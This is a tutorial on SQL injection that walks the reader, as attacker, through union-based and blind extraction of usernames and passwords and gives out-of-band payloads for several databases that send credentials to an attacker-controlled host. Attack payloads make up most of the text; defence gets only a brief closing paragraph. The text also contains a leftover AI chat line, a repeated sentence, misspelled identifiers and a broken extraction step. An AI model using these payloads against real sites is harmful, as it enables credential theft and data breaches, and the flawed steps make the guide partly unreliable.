## Introduction

In the realm of cybersecurity, SQL Injection (SQLi) stands as a significant threat to the integrity and security of web applications. This form of attack, which involves the execution of malicious SQL statements (often referred to as a malicious payload), can manipulate a web application's database server, typically a Relational Database Management System (RDBMS). Given that an SQL Injection vulnerability could potentially affect any website or web application that utilizes an SQL-based database, it is considered one of the oldest, most prevalent, and most dangerous web application vulnerabilities.

When an attacker exploits an SQL Injection vulnerability, they can bypass a web application's authentication and authorization mechanisms, potentially gaining access to the entire database. This vulnerability can also be used to add, modify, and delete records in a database, thereby affecting data integrity.

The implications of SQL Injection are far-reaching. It can provide an attacker with unauthorized access to sensitive data, including customer data, personally identifiable information (PII), trade secrets, intellectual property, and other sensitive information.

* * *

## What's the Worst an Attacker Can Do with SQL?

SQL is a programming language designed for managing data stored in an RDBMS, therefore SQL can be used to access, modify and delete data. Furthermore, in specific cases, an RDBMS could also run commands on the operating system from an SQL statement.

Keeping the above in mind, when considering the following, it’s easier to understand how lucrative a successful SQL Injection attack can be for an attacker.

- An attacker can use SQL Injection to bypass authentication or even impersonate specific users.
- One of SQL’s primary functions is to select data based on a query and output the result of that query. An SQL Injection vulnerability could allow the complete disclosure of data residing on a database server.
- Since web applications use SQL to alter data within a database, an attacker could use SQL Injection to alter data stored in a database. Altering data affects data integrity and could cause reputation issues, for instance, issues such as voiding transactions, altering balances and other records.
- SQL is used to delete records from a database. An attacker could use an SQL Injection vulnerability to delete data from a database. Even if an appropriate backup strategy is employed, the deletion of data could affect an application’s availability until the database is restored.
- Some database servers are configured (intentional or otherwise) to allow arbitrary execution of operating system commands on the database server. Given the right conditions, an attacker could use SQL Injection as the initial vector in an attack of an internal network that sits behind a firewall.

### The Anatomy Of An Sql Injection Attack

An SQL Injection needs just two conditions to exist **a relational database that uses SQL**, and **a user-controllable input which is directly used in an SQL query.** Errors are very useful to developers during development, but if enabled on a live site, they can reveal a lot of information to an attacker. SQL errors tend to be descriptive to the point where an attacker can obtain information about the structure of the database, and in some cases, even to enumerate an entire database just through extracting information from error messages.

* * *

## In-band SQL Injection

In-band SQL Injection is a type of SQL Injection attack where the attacker uses the same communication channel to both launch the attack and gather results. This is the most common and easy-to-exploit type of SQL Injection attack.

There are two main types of In-band SQLi attacks:

1. **Error-Based SQLi**: This is a subtype of In-band SQLi where the result returned to the attacker is a database error string. The attacker can use the received error string to get information about the type and version of the database, the structure of the database, and even extract data out of the database.
2. **Union-Based SQLi**: This type of In-band SQLi leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.

In essence, In-band SQLi occurs when an attacker is able to modify the original query and receive the direct results of the modified query. Despite the simplicity of this attack, it can lead to serious data breaches if the vulnerability is not properly mitigated.

So let's start with some action.

### Check for Vulnerability

Let's say that we have some sites like this.

```html
http://server/news.php?id=5
```

Now to test if is vulnerable we add to the end of URL' (quote), and that would be:

```html
http://server/news.php?id=5'
```

So if we get some error like:

"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc ..." or something similar that means is vulnerable to SQL injection.

### Find the Number Of Columns

To find the number of columns we use statement ORDER BY (tells the database how to order the result) so how to use it? Well just incrementing the number until we get an error.

```html
http://server/news.php?id=5 order by 1/*http://server/news.php?id=5 order by 2/*http://server/news.php?id=5 order by 3/*http://server/news.php?id=5 order by 4/*
```

The last query will generate an error message like this Unknown column '4' in 'order clause' or something like that. That means that it has 3 columns, cause we got an error on 4.

### Check for UNION Function

With the union, we can select more data in one SQL statement. So we have:

```html
http://server/news.php?id=5 union all select 1,2,3
```

If we see some numbers on screen i.e 1 or 2 or 3 then the UNION Works.

### Check for MySQL Version

```html
http://server/news.php?id=5 union all select 1,2,3/*
```

**NOTE:** If \* not working or you get some error, then try "-" it's a comment and it's important for our query to work properly.

Let say that we have number 2 on the screen, now to check for the version we replace the number 2 with @@version or version() and get something like 4.1.33-log or 5.0.45 or similar.

```html
http://server/news.php?id=5 union all select 1,@@version,3/*
```

If you get an error "union + illegal mix of collations (IMPLICIT + COERCIBLE) ...", what you will need to do is to use the **convert()** function as per the below example.

**Example**

```html
http://server/news.php?id=5 union all select 1,convert(@@version using latin1),3/*
```

Or with **hex()** and **unhex()**

**Example**

```html
http://server/news.php?id=5 union all select 1,unhex(hex(@@version)),3/*
```

And you will get MySQL version

### Getting Table and Column Names

Well if the MySQL version is < 5 (example, 4.1.33, 4.1.12...), we must guess table and column name in most cases. Common table names are: user/s, admin/s, member/s. Common table names are: user/s, admin/s, member/s. Common column names are username, user, usr, user\_name, password, pass, passwd, pwd etc...

**Example**

```html
http://server/news.php?id=5 union all select 1,2,3 from admin/*
```

We see number 2 on the screen like before, and that's good. We get username displayed on the screen, an example would be admin, or superadmin etc...

Now to check if the column password exists.

```html
http://server/news.php?id=5 union all select 1,password,3 from admin/*
```

We seen the password on the screen in hash or plain-text, it depends on how the database is set up i.e md5 hash, mysql hash, sha1. Now we must complete the query to look nice. For that we can use **concat()** function (it joins strings)

**Example**

```html
http://server/news.php?id=5 union all select1,concat(username,0x3a,password),3 from admin/*
```

**NOTE:** We used 0x3a, it’s a hexadecimal value (0x3a is the hexadecimal value for the column). Another method is to use char (58) in ascii mode.

```html
http://server/news.php?id=5 union all select 1,concat(username,char(58), password),3 from admin/*
```

Now we get displayed username:password on screen, i.e admin:admin or admin:somehash when you have this, you can log in like admin or some superuser. If can't guess the right table name, you can always try "mysql.user", as per the following example:

```html
http://server/news.php?id=5 union all select 1,concat(user,0x3a,password),3 from mysql.user/*
```

### MySQL 5

For this we need **"information\_schema"** table. It contains all tables and columns architecture of the database. To get the tables we use **"table\_name"** and **"information\_schema.tables"**.

**Example**

```html
http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables/*
```

Here we replace the number 2 with **"table\_name"** to get the first table from **"information\_schema"**.tables displayed on the screen. Furthermore, we will need to add LIMIT to the end of the query to list out al tables.

**Example**

```html
http://server/news.php?id=5 union all select 1,table_name,3 from infor-mation_schema.tables limit 0,1/*
```

**NOTE:** That we put 0,1 (To get 1 result starting from the 0th) now to view the second table, we change "limit 0,1" to "limit 1,1".

**Example**

```html
http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 1,1/*
```

The second table is displayed. If you want to do the same for the third table let’s move on using: "limit 2,1"

**Example**

```html
http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 2,1/*
```

Keep incrementing until you get some useful like db\_admin, poll\_user, auth, auth\_user, etc...

To get the column names the method is similar. Here we use **"column\_name"** and **"infor-mation\_schema.columns"** as per the following example:

```html
http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns limit 0,1/*
```

The first column is getting displayed so to move further and retrieve the second we will need once again change "limit 0,1" to "limit 1,1".

**Example**

```html
http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns limit 1,1/*
```

The second column is displayed, so keep incrementing until you get something like username, user, login, password, pass, passwd, etc... If you want to display the column names for specific table use the following query:

**Example**

```html
http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns where table_name='users'/*
```

Now we get displayed column name in table users. Note, this won’t work if the magic quotes are ON. Let’s say that we found columns user, pass and email, now to complete the query, we put them all together and for that, we will use **concat()**.

**Example**

```html
http://server/news.php?id=5 union all select 1, concat(user,0x3a,pass,0x3a,email) from users/*
```

From the above example, we shall get the user:pass:email from table users.

* * *

## Blind SQL Injection

Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection. 

Blind SQLi is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible.

There are two main types of Blind SQLi attacks:

1. **Content-Based Blind SQLi**: The attacker injects a query that returns 'true' or 'false' and observes the content of the page. If the content of the page that returns 'true' is different than that of the page that returns 'false', then the attacker is able to distinguish when the executed query returns true or false.
2. **Time-Based Blind SQLi**: This type of blind SQL injection relies on the database pausing for a specified amount of time, then returning the results, indicating successful SQL query executing. The attacker enumerates each letter of the desired piece of data using logic that causes the database to wait for a specified amount of time if a condition is true.

In essence, Blind SQLi occurs when a web application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. Despite the lack of visible feedback, it is still possible to exploit blind SQL injection to access unauthorized data.

A normal query should be as per the following example:

```html
http://server/news.php?id=5 and 1=1 <-- this is always true
```

Now to check if the website is subject to blind SQL injection just switch "1" by "2"

```html
http://server/news.php?id=5 and 1=2 <-- this is false
```

If your page is returned with some missing content such as text or images that simply means the page is vulnerable to blind SQL injection.

### Get the MySQL Version

To get the version of MySQL in a blind attack we use substring.

```html
http://server/news.php?id=5 and substring(@@version,1,1)=4
```

The above query should return TRUE if the version of MySQL is "4". Replace "4" by "5", and if the query returns TRUE we can understand that the current MySQL version is "5".

**Example**

```html
http://server/news.php?id=5 and substring(@@version,1,1)=5
```

Here's the corrected and enhanced version of your article:

### Testing the Subselect Function

In some instances, the "select" function may not operate as expected. In such cases, "subselect" can serve as an alternative.

**Example**

```html
http://server/news.php?id=5 and (select 1)=1
```

If the page loads correctly, it indicates that the "subselect" function is operational. The subsequent step involves checking if we can access "mysql.user".

**Example**

```html
http://server/news.php?id=5 and (select 1 from mysql.user limit 0,1)=1
```

If the page loads without issues, it means we have access to "mysql.user". Based on this query, we can extract information, such as a password, using the **load\_file()** function and **OUTFILE**.

### Identifying Table and Column Names

This part of the process relies heavily on educated guessing and online research.

**Example**

```html
http://server/news.php?id=5 and (select 1 from users limit 0,1)=1
```

In the above example, "limit 0,1" ensures our query returns "1 row of data". If the page loads normally without any missing content, it implies that the "users" table exists. If you encounter FALSE, such as missing content on the page, alter the table name until you find the correct one.

Assuming we have identified "users" as the table name, the next step is to determine the column name using the same methodology. We can start with a common name like "password".

**Example**

```html
http://server/news.php?id=5 and (select substring(concat(1,password),1,1) from users limit 0,1)=1
```

If the page loads correctly, we can conclude that the column name is "password". If we encounter FALSE, we should try another common name. In the above example, we merge "1" with the column "password", and the **substring()** function returns the first character.

### Extracting Data from the Database

Assuming we have identified "users" as the table and "username" and "password" as the columns, we can now extract relevant information.

```html
http://server/news.php?id=5 and ascii(substring((SELECT concat (username,0x3a,password) from users limit 0,1),1,1))>80
```

In the above query, the **substring()** function returns the first character from the first user in the "users" table. The **ascii()** function converts that first character into its ASCII value and then compares it with the symbol greater than (">").

At this point, you should understand that if the ASCII character is greater than 80, the page will load correctly. We need to continue this process until we get false.

```html
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>95
```

Once again, we get TRUE, so we continue incrementing.

```html
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>98
```

We get TRUE again, so we continue.

```html
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
```

We get FALSE! We have determined that the first character in the username is char(99). Using an ASCII converter, we can easily understand that char(99) is the letter 'c'.

We will now proceed to the second character.

```html
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))>99
```

**NOTE:** To proceed to the second character, we have changed ",1,1" to ",2,1".

```html
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
```

As before, if we get TRUE, we must continue incrementing.

```html
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>107
```

We get FALSE, so let's try a lower number.

```html
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>104
```

We get TRUE, so let's try a higher number.

```html
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>105
```

Finally, we get FALSE! We have determined that the second character is char(105). Again, using the ASCII converter, we can easily understand that char(105) is the letter "i".

The most challenging part of this methodology is the time required to retrieve the complete username or any other string you wish to find.

* * *

## Out-of-band SQL Injections

Out-of-band SQL injection (OOB SQLi) is a type of SQL injection where the attacker does not receive a response from the attacked application on the same communication channel but instead is able to cause the application to send data to a remote endpoint that they control. This technique is particularly useful when the server responses are not very stable, making an inferential time-based attack unreliable.

### How Hackers Find and Exploit It

Out-of-band SQL injection is only possible if the server that you are using has commands that trigger DNS or HTTP requests. However, that is the case with all popular SQL servers. Now let see step-by-step how hackers find OOB SQLi.

- **Identify User Input Fields**: Start by identifying all the user input fields on the website. These are common points of exploitation.
- **Test for Vulnerabilities**: Test these fields for vulnerabilities by inserting special characters or SQL commands. For instance, appending a single quote (') to the input can help identify potential vulnerabilities.
- **Analyze HTTP Requests and Responses**: If the website returns an error, it might indicate that the input is being incorporated into a SQL query without proper sanitization. Analyze the HTTP requests sent to and responses received from the server. This can provide clues about the structure of the underlying SQL queries.
- **Craft Payloads**: If a potential vulnerability is identified, craft payloads designed to manipulate the SQL queries. In the case of OOB SQLi, these payloads aim to cause the application to send data to a remote endpoint controlled by the attacker.
- **Monitor Remote Endpoint**: Finally, monitor the remote endpoint for any data sent by the application. If data is received, it confirms the presence of an OOB SQLi vulnerability.

Here are some examples of how this can be exploited in different SQL servers:

If the MySQL database server is started with an empty `secure_file_priv` global system variable, which is the case by default for MySQL server 5.5.52 and below (and in the MariaDB fork), an attacker can exfiltrate data and then use the `load_file` function to create a request to a domain name, putting the exfiltrated data in the request.

```html
SELECT  load_file( CONCAT('\\\\\\\\',(SELECT+ @@version),'.',(SELECT+user),'.', (SELECT+ password),'.', example. com\\\\test. txt'))
```

This will cause the application to send a DNS request to the domain as per the following example: `database_version.database_user.database_password.example.com` and so, exposing sensitive data (database version, user name, and the user’s password) to the attacker.

### PostgreSQL

The following SQL query achieves the same result as above if the application is using a PostgreSQL database:

```html
DROP TABLE IF EXISTS  table_output;
CREATE TABLE  table_output( content  text);
CREATE OR REPLACE FUNCTION  temp_function()RETURNS  VOID  AS  $$  
DECLARE  exec_cmd  TEXT; 
DECLARE  query_result_version  TEXT; 
DECLARE  query_result_user  TEXT; 
DECLARE  query_result_password  TEXT; 
BEGIN 
SELECT INTO  query_result_version  (SELECT  current_setting('server_version')); 
SELECT INTO  query_result_user  (SELECT  usename  FROM  pg_shadow); 
SELECT INTO  query_result_password  (SELECT  passwd  FROM  pg_shadow);  
exec_cmd :=  E'COPY table_output(content) FROM E\\'\\\\\\\\\\\\\\\\'|| query_result_version||'.'|| query_result_user||'.'|| query_result_password || E '.example.com\\\\\\\\test.txt\\''; 
EXECUTE  exec_cmd; 
END;  
$$  LANGUAGE  plpgsql SECURITY  DEFINER; 
SELECT  temp_function();
```

The culprit, in this case, is the `COPY` function in PostgreSQL, which is intended to move data between a file and a table. Here, it allows the attacker to include a remote file as the copy source.

### Oracle

The following SQL query achieves the same result as above if the application is using an Oracle database:

```html
SELECT  DBMS_LDAP. INIT( (SELECT  version  FROM  v$instance)||'.'|| (SELECT user FROM  dual)||'.'|| (SELECT  name  FROM  v$database)||'.'|| example. com'  ,80) FROM  dual;
```

### MSSQL

In MSSQL, the `xp_dirtree` function can be used to trigger a DNS lookup. If an attacker controls the authoritative name server for a domain, they can see the requests within the server logs. Here's an example payload:

```html
EXEC master..xp_dirtree '\\\\attacker.example.com\\foo' -- This would cause a DNS lookup to the attacker.example.com domain.
```

To prevent false positives, the hostname can be split, such as:

```html
declare @q varchar(1024);
set @q = 'master..xp_dirtree '\\\\' + user_name() + '.attacker.example.com\\foo';
exec(@q)
```

The above payload takes the current username, appends it to the attacker-controlled hostname as a subdomain, and sends it to the attacker-controlled server from which it can be extracted from the logs.

If the output is too long, it can be split using `substring`, like this:

```html
declare @q varchar(1024);
set @q='master..xp_dirtree '\\\\'+SUBSTRING(user_name(),1,60)+'.attacker.example.com\\foo';
exec(@q)

declare @q varchar(1024);
set @q='master..xp_dirtree '\\\\'+SUBSTRING(user_name(),61,60)+'.attacker.example.com\\foo';
exec(@q)
```

### HTTP/SMB

In addition to DNS, protocols such as HTTP and SMB can also be used for **out-of-band exploitation**. The idea is the same: instead of inferring content in the database through something like Boolean logic, you can request the target system transmit the information over protocols such as HTTP, SMB, or DNS.

Out-of-band SQL injections provide a powerful tool for attackers to exfiltrate data from a database. It is crucial for developers to be aware of this vulnerability and take necessary precautions to prevent such attacks.

* * *

## Conclusion

It’s important to note that these types of SQL Injection attacks can be further divided into subtypes based on their specific characteristics and methods. For example, **Blind SQL Injection** can be further classified into **Boolean-based Blind SQL Injection** and **Time-based Blind SQL Injection**. Similarly, **In-band SQL Injection** can be further divided into **Error-based SQL Injection** and **Union-based SQL Injection**. Each of these subtypes exploits different aspects of SQL queries and database responses.

Remember, the best defense against SQL Injection attacks is to follow secure coding practices, such as using parameterized queries or prepared statements, and regularly updating and patching systems. It’s also crucial to validate and sanitize all user inputs to prevent the insertion of malicious SQL code.

The threat of SQL Injection attacks underscores the importance of robust cybersecurity measures. Understanding the nature of these attacks, their potential impact, and the conditions under which they occur is crucial for developing effective strategies to prevent them and safeguard sensitive data.